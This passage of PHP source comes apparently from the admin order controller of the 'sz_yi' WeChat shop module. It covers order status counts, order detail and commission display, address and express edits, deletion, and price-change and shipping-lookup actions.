    $totals['status5'] = pdo_fetchcolumn('SELECT COUNT(*) FROM ' . tablename('sz_yi_order') . ' o ' . ' left join ( select rr.id,rr.orderid,rr.status from ' . tablename('sz_yi_order_refund') . ' rr left join ' . tablename('sz_yi_order') . ' ro on rr.orderid =ro.id  order by rr.id desc limit 1) r on r.orderid= o.id' . ' left join ' . tablename('sz_yi_member') . ' m on m.openid=o.openid  and m.uniacid =  o.uniacid' . ' left join ' . tablename('sz_yi_member_address') . ' a on o.addressid = a.id ' . ' left join ' . tablename('sz_yi_member') . ' sm on sm.openid = o.verifyopenid and sm.uniacid=o.uniacid' . ' left join ' . tablename('sz_yi_saler') . ' s on s.openid = o.verifyopenid and s.uniacid=o.uniacid' . " WHERE $condition AND o.refundtime<>0 AND o.refundid<>0 $cond ", $paras);
    

    $pager = pagination($total, $pindex, $psize);
    $stores = pdo_fetchall("select id,storename from " . tablename("sz_yi_store") . " where uniacid=:uniacid ", array(
        ":uniacid" => $_W["uniacid"]
    ));
    load()->func("tpl");
    include $this->template('order');
    exit;
} elseif ($operation == "detail") {
    $id = intval($_GPC["id"]);
    $p = p("commission");
    $item = pdo_fetch("SELECT * FROM " . tablename("sz_yi_order") . " WHERE id = :id and uniacid=:uniacid", array(
        ":id" => $id,
        ":uniacid" => $_W["uniacid"]
    ));
    $item["statusvalue"] = $item["status"];
    $shopset = m("common")->getSysset("shop");
    if (empty($item)) {
        message("抱歉，订单不存在!", referer() , "error");
    }
    if (!empty($item["refundid"])) {
        ca("order.view.status4");
    } else {
        if ($item["status"] == - 1) {
            ca("order.view.status_1");
        } else {
            ca("order.view.status" . $item["status"]);
        }
    }
    if ($_W["ispost"]) {
        pdo_update("sz_yi_order", array(
            "remark" => trim($_GPC["remark"]) ,
        ) , array(
            "id" => $item["id"],
            "uniacid" => $_W["uniacid"]
        ));
        plog("order.op.saveremark", "订单保存备注  ID: {$item["id"]} 订单号: {$item["ordersn"]}");
        message("订单备注保存成功！", $this->createWebUrl("order", array(
            "op" => "detail",
            "id" => $item["id"]
        )) , "success");
    }
    $member = m("member")->getMember($item["openid"]);
    $dispatch = pdo_fetch("SELECT * FROM " . tablename("sz_yi_dispatch") . " WHERE id = :id and uniacid=:uniacid", array(
        ":id" => $item["dispatchid"],
        ":uniacid" => $_W["uniacid"]
    ));
    if (empty($item["addressid"])) {
        $user = unserialize($item["carrier"]);
    } else {
        $user = iunserializer($item["address"]);
        if (!is_array($user)) {
            $user = pdo_fetch("SELECT * FROM " . tablename("sz_yi_member_address") . " WHERE id = :id and uniacid=:uniacid", array(
                ":id" => $item["addressid"],
                ":uniacid" => $_W["uniacid"]
            ));
        }
        $address_info = $user["address"];
        $user["address"] = $user["province"] . " " . $user["city"] . " " . $user["area"] . " " . $user["address"];
        $item["addressdata"] = array(
            "realname" => $user["realname"],
            "mobile" => $user["mobile"],
            "address" => $user["address"],
        );
    }
    $refund = pdo_fetch("SELECT * FROM " . tablename("sz_yi_order_refund") . " WHERE orderid = :orderid and uniacid=:uniacid order by id desc", array(
        ":orderid" => $item["id"],
        ":uniacid" => $_W["uniacid"]
    ));
    if (!empty($refund)) {
        if (!empty($refund['imgs'])) {
            $refund['imgs'] = iunserializer($refund['imgs']);
        }
    }
    $diyformfields = "";
    $plugin_diyform = p("diyform");
    if ($plugin_diyform) {
        $diyformfields = ",diyformfields,diyformdata";
    }
    $goods = pdo_fetchall("SELECT g.*, o.goodssn as option_goodssn, o.productsn as option_productsn,o.total,g.type,o.optionname,o.optionid,o.price as orderprice,o.realprice,o.changeprice,o.oldprice,o.commission1,o.commission2,o.commission3,o.commissions{$diyformfields} FROM " . tablename("sz_yi_order_goods") . " o left join " . tablename("sz_yi_goods") . " g on o.goodsid=g.id " . " WHERE o.orderid=:orderid and o.uniacid=:uniacid", array(
        ":orderid" => $id,
        ":uniacid" => $_W["uniacid"]
    ));
    foreach ($goods as & $r) {
        if (!empty($r["option_goodssn"])) {
            $r["goodssn"] = $r["option_goodssn"];
        }
        if (!empty($r["option_productsn"])) {
            $r["productsn"] = $r["option_productsn"];
        }
        if ($plugin_diyform) {
            $r["diyformfields"] = iunserializer($r["diyformfields"]);
            $r["diyformdata"] = iunserializer($r["diyformdata"]);
        }
    }
    unset($r);
    $item["goods"] = $goods;
    $agents = array();
    if ($p) {
        $agents = $p->getAgents($id);
        $m1 = isset($agents[0]) ? $agents[0] : false;
        $m2 = isset($agents[1]) ? $agents[1] : false;
        $m3 = isset($agents[2]) ? $agents[2] : false;
        $commission1 = 0;
        $commission2 = 0;
        $commission3 = 0;
        foreach ($goods as & $og) {
            $oc1 = 0;
            $oc2 = 0;
            $oc3 = 0;
            $commissions = iunserializer($og["commissions"]);
            if (!empty($m1)) {
                if (is_array($commissions)) {
                    $oc1 = isset($commissions["level1"]) ? floatval($commissions["level1"]) : 0;
                } else {
                    $c1 = iunserializer($og["commission1"]);
                    $l1 = $p->getLevel($m1["openid"]);
                    $oc1 = isset($c1["level" . $l1["id"]]) ? $c1["level" . $l1["id"]] : $c1["default"];
                }
                $og["oc1"] = $oc1;
                $commission1+= $oc1;
            }
            if (!empty($m2)) {
                if (is_array($commissions)) {
                    $oc2 = isset($commissions["level2"]) ? floatval($commissions["level2"]) : 0;
                } else {
                    $c2 = iunserializer($og["commission2"]);
                    $l2 = $p->getLevel($m2["openid"]);
                    $oc2 = isset($c2["level" . $l2["id"]]) ? $c2["level" . $l2["id"]] : $c2["default"];
                }
                $og["oc2"] = $oc2;
                $commission2+= $oc2;
            }
            if (!empty($m3)) {
                if (is_array($commissions)) {
                    $oc3 = isset($commissions["level3"]) ? floatval($commissions["level3"]) : 0;
                } else {
                    $c3 = iunserializer($og["commission3"]);
                    $l3 = $p->getLevel($m3["openid"]);
                    $oc3 = isset($c3["level" . $l3["id"]]) ? $c3["level" . $l3["id"]] : $c3["default"];
                }
                $og["oc3"] = $oc3;
                $commission3+= $oc3;
            }
        }
        unset($og);
    }
    $condition = " o.uniacid=:uniacid and o.deleted=0";
    $paras = array(
        ":uniacid" => $_W["uniacid"]
    );
    if(!empty($bonusagentid)){
        $sql = "select distinct orderid from " . tablename('sz_yi_bonus_goods') . " where mid=:mid ORDER BY id DESC";
        $bonusoderids = pdo_fetchall($sql,array(':mid'=>$bonusagentid), 'orderid');
        $inorderids = "";

        if(!empty($bonusoderids)){
            $condition .= ' and  o.id in('.implode(',', array_keys($bonusoderids)).')';
        }else{
            $condition .= ' and  o.id=0';
        }
    }
    $totals = array();
    $totals["all"] = pdo_fetchcolumn("SELECT COUNT(*) FROM " . tablename("sz_yi_order") . " o " . " left join ( select rr.id,rr.orderid,rr.status from " . tablename("sz_yi_order_refund") . " rr left join " . tablename("sz_yi_order") . " ro on rr.orderid =ro.id order by rr.id desc limit 1) r on r.orderid= o.id" . " left join " . tablename("sz_yi_member") . " m on m.openid=o.openid  and m.uniacid =  o.uniacid" . " left join " . tablename("sz_yi_member_address") . " a on o.addressid = a.id " . " left join " . tablename("sz_yi_member") . " sm on sm.openid = o.verifyopenid and sm.uniacid=o.uniacid" . " left join " . tablename("sz_yi_saler") . " s on s.openid = o.verifyopenid and s.uniacid=o.uniacid" . " WHERE $condition", $paras);
    $totals["status_1"] = pdo_fetchcolumn("SELECT COUNT(*) FROM " . tablename("sz_yi_order") . " o " . " left join ( select rr.id,rr.orderid,rr.status from " . tablename("sz_yi_order_refund") . " rr left join " . tablename("sz_yi_order") . " ro on rr.orderid =ro.id order by rr.id desc limit 1) r on r.orderid= o.id" . " left join " . tablename("sz_yi_member") . " m on m.openid=o.openid  and m.uniacid =  o.uniacid" . " left join " . tablename("sz_yi_member_address") . " a on o.addressid = a.id " . " left join " . tablename("sz_yi_member") . " sm on sm.openid = o.verifyopenid and sm.uniacid=o.uniacid" . " left join " . tablename("sz_yi_saler") . " s on s.openid = o.verifyopenid and s.uniacid=o.uniacid" . " WHERE $condition and o.status=-1 and o.refundtime=0", $paras);
    $totals["status0"] = pdo_fetchcolumn("SELECT COUNT(*) FROM " . tablename("sz_yi_order") . " o " . " left join ( select rr.id,rr.orderid,rr.status from " . tablename("sz_yi_order_refund") . " rr left join " . tablename("sz_yi_order") . " ro on rr.orderid =ro.id order by rr.id desc limit 1) r on r.orderid= o.id" . " left join " . tablename("sz_yi_member") . " m on m.openid=o.openid  and m.uniacid =  o.uniacid" . " left join " . tablename("sz_yi_member_address") . " a on o.addressid = a.id " . " left join " . tablename("sz_yi_member") . " sm on sm.openid = o.verifyopenid and sm.uniacid=o.uniacid" . " left join " . tablename("sz_yi_saler") . " s on s.openid = o.verifyopenid and s.uniacid=o.uniacid" . " WHERE $condition and o.status=0 and o.paytype<>3", $paras);
    $totals["status1"] = pdo_fetchcolumn("SELECT COUNT(*) FROM " . tablename("sz_yi_order") . " o " . " left join ( select rr.id,rr.orderid,rr.status from " . tablename("sz_yi_order_refund") . " rr left join " . tablename("sz_yi_order") . " ro on rr.orderid =ro.id order by rr.id desc limit 1) r on r.orderid= o.id" . " left join " . tablename("sz_yi_member") . " m on m.openid=o.openid  and m.uniacid =  o.uniacid" . " left join " . tablename("sz_yi_member_address") . " a on o.addressid = a.id " . " left join " . tablename("sz_yi_member") . " sm on sm.openid = o.verifyopenid and sm.uniacid=o.uniacid" . " left join " . tablename("sz_yi_saler") . " s on s.openid = o.verifyopenid and s.uniacid=o.uniacid" . " WHERE $condition and ( o.status=1 or ( o.status=0 and o.paytype=3) )", $paras);
    $totals["status2"] = pdo_fetchcolumn("SELECT COUNT(*) FROM " . tablename("sz_yi_order") . " o " . " left join ( select rr.id,rr.orderid,rr.status from " . tablename("sz_yi_order_refund") . " rr left join " . tablename("sz_yi_order") . " ro on rr.orderid =ro.id order by rr.id desc limit 1) r on r.orderid= o.id" . " left join " . tablename("sz_yi_member") . " m on m.openid=o.openid  and m.uniacid =  o.uniacid" . " left join " . tablename("sz_yi_member_address") . " a on o.addressid = a.id " . " left join " . tablename("sz_yi_member") . " sm on sm.openid = o.verifyopenid and sm.uniacid=o.uniacid" . " left join " . tablename("sz_yi_saler") . " s on s.openid = o.verifyopenid and s.uniacid=o.uniacid" . " WHERE $condition and o.status=2", $paras);
    $totals["status3"] = pdo_fetchcolumn("SELECT COUNT(*) FROM " . tablename("sz_yi_order") . " o " . " left join ( select rr.id,rr.orderid,rr.status from " . tablename("sz_yi_order_refund") . " rr left join " . tablename("sz_yi_order") . " ro on rr.orderid =ro.id order by rr.id desc limit 1) r on r.orderid= o.id" . " left join " . tablename("sz_yi_member") . " m on m.openid=o.openid  and m.uniacid =  o.uniacid" . " left join " . tablename("sz_yi_member_address") . " a on o.addressid = a.id " . " left join " . tablename("sz_yi_member") . " sm on sm.openid = o.verifyopenid and sm.uniacid=o.uniacid" . " left join " . tablename("sz_yi_saler") . " s on s.openid = o.verifyopenid and s.uniacid=o.uniacid" . " WHERE $condition and o.status=3", $paras);
    $totals["status4"] = pdo_fetchcolumn("SELECT COUNT(*) FROM " . tablename("sz_yi_order") . " o " . " left join ( select rr.id,rr.orderid,rr.status from " . tablename("sz_yi_order_refund") . " rr left join " . tablename("sz_yi_order") . " ro on rr.orderid =ro.id order by rr.id desc limit 1) r on r.orderid= o.id" . " left join " . tablename("sz_yi_member") . " m on m.openid=o.openid  and m.uniacid =  o.uniacid" . " left join " . tablename("sz_yi_member_address") . " a on o.addressid = a.id " . " left join " . tablename("sz_yi_member") . " sm on sm.openid = o.verifyopenid and sm.uniacid=o.uniacid" . " left join " . tablename("sz_yi_saler") . " s on s.openid = o.verifyopenid and s.uniacid=o.uniacid" . " WHERE $condition AND o.refundtime=0 AND o.refundid<>0", $paras);
    $totals["status5"] = pdo_fetchcolumn("SELECT COUNT(*) FROM " . tablename("sz_yi_order") . " o " . " left join ( select rr.id,rr.orderid,rr.status from " . tablename("sz_yi_order_refund") . " rr left join " . tablename("sz_yi_order") . " ro on rr.orderid =ro.id order by rr.id desc limit 1) r on r.orderid= o.id" . " left join " . tablename("sz_yi_member") . " m on m.openid=o.openid  and m.uniacid =  o.uniacid" . " left join " . tablename("sz_yi_member_address") . " a on o.addressid = a.id " . " left join " . tablename("sz_yi_member") . " sm on sm.openid = o.verifyopenid and sm.uniacid=o.uniacid" . " left join " . tablename("sz_yi_saler") . " s on s.openid = o.verifyopenid and s.uniacid=o.uniacid" . " WHERE $condition AND o.refundtime<>0 AND o.refundid<>0", $paras);
    $coupon = false;
    if (p("coupon") && !empty($item["couponid"])) {
        $coupon = p("coupon")->getCouponByDataID($item["couponid"]);
    }
    if (p("verify")) {
        if (!empty($item["verifyopenid"])) {
            $saler = m("member")->getMember($item["verifyopenid"]);
            $saler["salername"] = pdo_fetchcolumn("select salername from " . tablename("sz_yi_saler") . " where openid=:openid and uniacid=:uniacid limit 1 ", array(
                ":uniacid" => $_W["uniacid"],
                ":openid" => $item["verifyopenid"]
            ));
        }
        if (!empty($item["verifystoreid"])) {
            $store = pdo_fetch("select * from " . tablename("sz_yi_store") . " where id=:storeid limit 1 ", array(
                ":storeid" => $item["verifystoreid"]
            ));
        }
    }
    $show = 1;
    $diyform_flag = 0;
    $diyform_plugin = p("diyform");
    $order_fields = false;
    $order_data = false;
    if ($diyform_plugin) {
        $diyform_set = $diyform_plugin->getSet();
        foreach ($goods as $g) {
            if (!empty($g["diyformdata"])) {
                $diyform_flag = 1;
                break;
            }
        }
        if (!empty($item["diyformid"])) {
            $orderdiyformid = $item["diyformid"];
            if (!empty($orderdiyformid)) {
                $diyform_flag = 1;
                $order_fields = iunserializer($item["diyformfields"]);
                $order_data = iunserializer($item["diyformdata"]);
            }
        }
    }
    $refund_address = pdo_fetchall('select * from ' . tablename('sz_yi_refund_address') . ' where uniacid=:uniacid', array(
        ':uniacid' => $_W['uniacid']
    ));
    load()->func("tpl");
    if(p('hotel') && $item['order_type']=='3'){
         include $this->template("order_detail_hotel");
    }else{
         include $this->template("order_detail");
 
    }
    exit;
} elseif ($operation == 'saveexpress') {
    $id         = intval($_GPC['id']);
    $express    = $_GPC['express'];
    $expresscom = $_GPC['expresscom'];
    $expresssn  = trim($_GPC['expresssn']);
    if (empty($id)) {
        $ret = 'Url参数错误！请重试！';
        return show_json(0, $ret);
    }
    if (!empty($expresssn)) {
        $change_data               = array();
        $change_data['express']    = $express;
        $change_data['expresscom'] = $expresscom;
        $change_data['expresssn']  = $expresssn;
        pdo_update('sz_yi_order', $change_data, array(
            'id' => $id,
            'uniacid' => $_W['uniacid']
        ));
        $ret = '修改成功';
        return show_json(1, $ret);
    } else {
        $ret = '请填写快递单号！';
        return show_json(0, $ret);
    }
} elseif ($operation == "saveaddress") {
    $province = $_GPC["province"];
    $realname = $_GPC["realname"];
    $mobile = $_GPC["mobile"];
    $city = $_GPC["city"];
    $area = $_GPC["area"];
    $address = trim($_GPC["address"]);
    $id = intval($_GPC["id"]);
    if (!empty($id)) {
        if (empty($realname)) {
            $ret = "请填写收件人姓名！";
            return show_json(0, $ret);
        }
        if (empty($mobile)) {
            $ret = "请填写收件人手机！";
            return show_json(0, $ret);
        }
        if ($province == "请选择省份") {
            $ret = "请选择省份！";
            return show_json(0, $ret);
        }
        if (empty($address)) {
            $ret = "请填写详细地址！";
            return show_json(0, $ret);
        }
        $item = pdo_fetch("SELECT address FROM " . tablename("sz_yi_order") . " WHERE id = :id and uniacid=:uniacid", array(
            ":id" => $id,
            ":uniacid" => $_W["uniacid"]
        ));

        $address_array = iunserializer($item["address"]);
        $address_array["realname"] = $realname;
        $address_array["mobile"] = $mobile;
        $address_array["province"] = $province;
        $address_array["city"] = $city;
        $address_array["area"] = $area;
        $address_array["address"] = $address;
        $address_array = iserializer($address_array);
        pdo_update("sz_yi_order", array(
            "address" => $address_array
        ) , array(
            "id" => $id,
            "uniacid" => $_W["uniacid"]
        ));
        $ret = "修改成功";
        return show_json(1, $ret);
    } else {
        $ret = "Url参数错误！请重试！";
        return show_json(0, $ret);
    }
} elseif ($operation == "delete") {
    ca("order.op.delete");
    $orderid = intval($_GPC["id"]);
    pdo_update("sz_yi_order", array(
        "deleted" => 1
    ) , array(
        "id" => $orderid,
        "uniacid" => $_W["uniacid"]
    ));
    plog("order.op.delete", "订单删除 ID: {$id}");
    message("订单删除成功", $this->createWebUrl("order", array(
        "op" => "display"
    )) , "success");
} elseif ($operation == "deal") {
    $id = intval($_GPC["id"]);
    $item = pdo_fetch("SELECT * FROM " . tablename("sz_yi_order") . " WHERE id = :id and uniacid=:uniacid", array(
        ":id" => $id,
        ":uniacid" => $_W["uniacid"]
    ));
    $shopset = m("common")->getSysset("shop");
    if (empty($item)) {
        message("抱歉，订单不存在!", referer() , "error");
    }
    if (!empty($item["refundid"])) {
        ca("order.view.status4");
    } else {
        if ($item["status"] == - 1) {
            ca("order.view.status_1");
        } else {
            ca("order.view.status" . $item["status"]);
        }
    }
    $to = trim($_GPC["to"]);
    if ($to == 'confirmpay') {
        order_list_confirmpay($item);
    } else if ($to == 'cancelpay') {
        order_list_cancelpay($item);
    } else if ($to == 'confirmsend') {
        order_list_confirmsend($item);
    } else if ($to == 'cancelsend') {
        order_list_cancelsend($item);
    } else if ($to == 'confirmsend1') {
        order_list_confirmsend1($item);
    } else if ($to == 'cancelsend1') {
        order_list_cancelsend1($item);
    } else if ($to == "finish") {
        order_list_finish($item);
    } else if ($to == "close") {
        order_list_close($item);
    } else if ($to == "refund") {
        order_list_refund($item);
    } else if ($to == "changepricemodal") {
        if (!empty($item["status"])) {
            exit("-1");
        }
        $order_goods = pdo_fetchall("select og.id,g.title,g.thumb,g.goodssn,og.goodssn as option_goodssn, g.productsn,og.productsn as option_productsn, og.total,og.price,og.optionname as optiontitle, og.realprice,og.oldprice from " . tablename("sz_yi_order_goods") . " og " . " left join " . tablename("sz_yi_goods") . " g on g.id=og.goodsid " . " where og.uniacid=:uniacid and og.orderid=:orderid ", array(
            ":uniacid" => $_W["uniacid"],
            ":orderid" => $item["id"]
        ));
        if (empty($item["addressid"])) {
            $user = unserialize($item["carrier"]);
            $item["addressdata"] = array(
                "realname" => $user["carrier_realname"],
                "mobile" => $user["carrier_mobile"]
            );
        } else {
            $user = iunserializer($item["address"]);
            if (!is_array($user)) {
                $user = pdo_fetch("SELECT * FROM " . tablename("sz_yi_member_address") . " WHERE id = :id and uniacid=:uniacid", array(
                    ":id" => $item["addressid"],
                    ":uniacid" => $_W["uniacid"]
                ));
            }
            $user["address"] = $user["province"] . " " . $user["city"] . " " . $user["area"] . " " . $user["address"];
            $item["addressdata"] = array(
                "realname" => $user["realname"],
                "mobile" => $user["mobile"],
                "address" => $user["address"],
            );
        }
        load()->func("tpl");
        include $this->template("web/order/changeprice");
        exit;
    } else if ($to == "confirmchangeprice") {
        $changegoodsprice = $_GPC["changegoodsprice"];
        if (!is_array($changegoodsprice)) {
            message("未找到改价内容!", '', "error");
        }
        $changeprice = 0;
        foreach ($changegoodsprice as $ogid => $change) {
            $changeprice+= floatval($change);
        }
        $dispatchprice = floatval($_GPC["changedispatchprice"]);
        if ($dispatchprice < 0) {
            $dispatchprice = 0;
        }
        $orderprice = $item["price"] + $changeprice;
        $changedispatchprice = 0;
        if ($dispatchprice != $item["dispatchprice"]) {
            $changedispatchprice = $dispatchprice - $item["dispatchprice"];
            $orderprice+= $changedispatchprice;
        }
        if ($orderprice < 0) {
            message("订单实际支付价格不能小于0元！", '', "error");
        }
        foreach ($changegoodsprice as $ogid => $change) {
            $og = pdo_fetch("select price,realprice from " . tablename("sz_yi_order_goods") . " where id=:ogid and uniacid=:uniacid limit 1", array(
                ":ogid" => $ogid,
                ":uniacid" => $_W["uniacid"]
            ));
            if (!empty($og)) {
                $realprice = $og["realprice"] + $change;
                if ($realprice < 0) {
                    message("单个商品不能优惠到负数", '', "error");
                }
            }
        }
        $ordersn2 = $item["ordersn2"] + 1;
        if ($ordersn2 > 99) {
            message("超过改价次数限额", '', "error");
        }
        $orderupdate = array();
        if ($orderprice != $item["price"]) {
            $orderupdate["price"] = $orderprice;
            $orderupdate["ordersn2"] = $item["ordersn2"] + 1;
        }
        $orderupdate["changeprice"] = $item["changeprice"] + $changeprice;
        if ($dispatchprice != $item["dispatchprice"]) {
            $orderupdate["dispatchprice"] = $dispatchprice;
            $orderupdate["changedispatchprice"]+= $changedispatchprice;
        }
        if (!empty($orderupdate)) {
            pdo_update("sz_yi_order", $orderupdate, array(
                "id" => $item["id"],
                "uniacid" => $_W["uniacid"]
            ));
        }
        foreach ($changegoodsprice as $ogid => $change) {
            $og = pdo_fetch("select price,realprice,changeprice from " . tablename("sz_yi_order_goods") . " where id=:ogid and uniacid=:uniacid limit 1", array(
                ":ogid" => $ogid,
                ":uniacid" => $_W["uniacid"]
            ));
            if (!empty($og)) {
                $realprice = $og["realprice"] + $change;
                $changeprice = $og["changeprice"] + $change;
                pdo_update("sz_yi_order_goods", array(
                    "realprice" => $realprice,
                    "changeprice" => $changeprice
                ) , array(
                    "id" => $ogid
                ));
            }
        }
        if (abs($changeprice) > 0) {
            $pluginc = p("commission");
            if ($pluginc) {
                $pluginc->calculate($item["id"], true);
            }
        }
        plog("order.op.changeprice", "订单号： {$item["ordersn"]} <br/> 价格： {$item["price"]} -> {$orderprice}");
        message("订单改价成功!", referer() , "success");
    } else if ($to == 'refundexpress') {
        $flag     = intval($_GPC['flag']);
        $refundid = $item['refundid'];
        if (!empty($refundid)) {
            $refund = pdo_fetch('select * from ' . tablename('sz_yi_order_refund') . ' where id=:id and uniacid=:uniacid  limit 1', array(
                ':id' => $refundid,
                ':uniacid' => $_W['uniacid']
            ));
        } else {
            die('未找到退款申请.');
            exit;
        }
        if ($flag == 1) {
            $express   = trim($refund['express']);
            $expresssn = trim($refund['expresssn']);
        } else if ($flag == 2) {
            $express   = trim($refund['rexpress']);
            $expresssn = trim($refund['rexpresssn']);
        }
        $content = getExpress($express, $expresssn);
        if (!$content) {
            $content = getExpress($express, $expresssn);
            if (!$content) {
                die('未找到物流信息.');
            }
        }
        foreach ($content as $data) {
            $list[] = array('time' => $data->time, 'step' => $data->context, 'ts' => $data->time);
        }
        load()->func('tpl');
        include $this->template('web/order/express');
        exit;
    } else if ($to == "express") {
        $express = trim($item["express"]);
        $expresssn = trim($item["expresssn"]);
        $content = getExpress($express, $expresssn);
        if (!$content) {
            $content = getExpress($express, $expresssn);
            if (!$content) {
                die('未找到物流信息.');
            }
        }
        foreach ($content as $data) {
            $list[] = array('time' => $data->time, 'step' => $data->context, 'ts' => $data->time);
        }
        load()->func("tpl");
        include $this->template("web/order/express");
        exit;
    }
    exit;
}